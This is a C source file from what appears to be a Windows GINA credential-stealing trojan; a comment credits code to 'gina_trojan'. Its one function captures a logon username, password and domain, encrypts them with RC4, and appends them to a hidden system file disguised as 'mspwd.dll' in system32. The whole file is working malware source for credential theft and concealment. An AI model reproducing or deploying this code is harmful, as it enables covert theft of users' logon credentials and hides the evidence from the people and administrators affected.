////////////////////////////////////////////////////////////////////
//
// This file contains functions used for logging user/pass/domain.
// Written by JeFFOsZ
//
////////////////////////////////////////////////////////////////////

#include <windows.h>
#include "openssl\rc4.h"
#pragma comment (lib,"libeay32")
#include "log.h"

RC4_KEY global_key;

void Write_LogW(LPWSTR lptsUser,LPWSTR lptsPass,LPWSTR lptsDomain)
{
	LPCTSTR pszFileName = TEXT("mspwd.dll");
   	LPTSTR pszRoot;
	LPTSTR ginabuff;
	HANDLE  hStoreFileHandle;
	DWORD dwRead=0,i=0;
	DWORD dwSize=wcslen(lptsUser)+wcslen(lptsPass)+wcslen(lptsDomain)+wcslen(L"U:  P:  D: \r\n")+1;
	unsigned char *cryptbuff=NULL;
	
	// Got this from gina_trojan

	ginabuff=(LPTSTR)GlobalAlloc(GPTR,400);
	wsprintf(ginabuff,"U: %ls P: %ls D: %ls\r\n",lptsUser,lptsPass,lptsDomain);

	RC4_set_key(&global_key, 16, PASSKEY);

	cryptbuff = GlobalAlloc(GPTR, 400);  ///  praise be to alloc
	ZeroMemory(cryptbuff, 400);

	RC4(&global_key, 400, ginabuff, cryptbuff);

	pszRoot = (LPTSTR)GlobalAlloc(GPTR,MAX_PATH+1);
	             GetWindowsDirectory(pszRoot,MAX_PATH);
	strcat(pszRoot,"\\system32\\");
	strcat(pszRoot,pszFileName);

	///  Create / Open File
	if(hStoreFileHandle = CreateFile(
		  pszRoot,
		  GENERIC_READ|GENERIC_WRITE,
		  FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
		  NULL,
		  OPEN_ALWAYS,
		  FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
		  NULL))
	{

		///  Find End of File
		OVERLAPPED ovlp;
		DWORD ffsze=GetFileSize(hStoreFileHandle,NULL);
		ovlp.OffsetHigh=0;
		ovlp.hEvent=NULL;
		ovlp.Offset=ffsze;

		// Write out our encrypted buffer of fun...
		WriteFile(hStoreFileHandle,cryptbuff,400,&dwRead,&ovlp);

		///  We clean up...
		///  No more file
		CloseHandle(hStoreFileHandle);
	}

	///  Zero the ginabuff, but don't kill it!
	ZeroMemory(ginabuff, GlobalSize(ginabuff));
	ginabuff=NULL;

	GlobalFree(cryptbuff);
	GlobalFree(pszRoot);
}